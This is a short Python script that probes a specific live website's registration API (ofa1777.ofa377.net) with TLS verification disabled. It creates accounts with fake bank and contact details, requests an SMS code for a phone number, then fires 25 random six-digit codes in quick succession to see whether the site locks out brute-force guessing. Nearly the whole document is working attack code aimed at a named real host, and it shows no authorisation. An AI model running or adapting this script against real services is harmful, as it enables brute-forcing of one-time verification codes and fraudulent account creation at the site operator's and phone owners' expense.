import httpx, random, json, sys
BASE="https://ofa1777.ofa377.net/api"
H={"Content-Type":"application/json","Origin":"https://ofa1777.ofa377.net","Referer":"https://ofa1777.ofa377.net/"}
c=httpx.Client(verify=False,timeout=15)
# suppress warnings
import urllib3; urllib3.disable_warnings()

def reg(phone, code, user):
    d={"bank_account":"123","bank_code":"CMB","bank_currency":"TWD","bank_name":"Test","email":"t%d@example.com"%random.randint(1,1e9),"line":"l%d"%random.randint(1,999),"name":"Test","password":"Passw0rd!123","phone_number":phone,"refer_code":"","username":user,"verify_code":code}
    r=c.post(BASE+"/v2/register/",data=json.dumps(d),headers=H)
    try: b=r.json()
    except: b={"raw":r.text[:200]}
    return r.status_code, b

# 1) baseline: no sms sent
print("BASELINE (no sms):", reg("886900000001","123456","bf_user1"))
# 2) send sms to a phone, then try a few codes rapidly, detect lockout
P="886900000002"
r=c.post(BASE+"/v2/sms/send",data=json.dumps({"phone_number":P}),headers=H)
print("SMS send:", r.status_code, r.text[:120])
seen={}
for i in range(25):
    sc,b=reg(P, str(random.randint(0,999999)).zfill(6), "bf_user2")
    seen.setdefault((sc, b.get("error_code")), 0)
    seen[(sc,b.get("error_code"))]+=1
print("error dist after 25 attempts (same phone):", seen)
print("sample last:", sc, b)
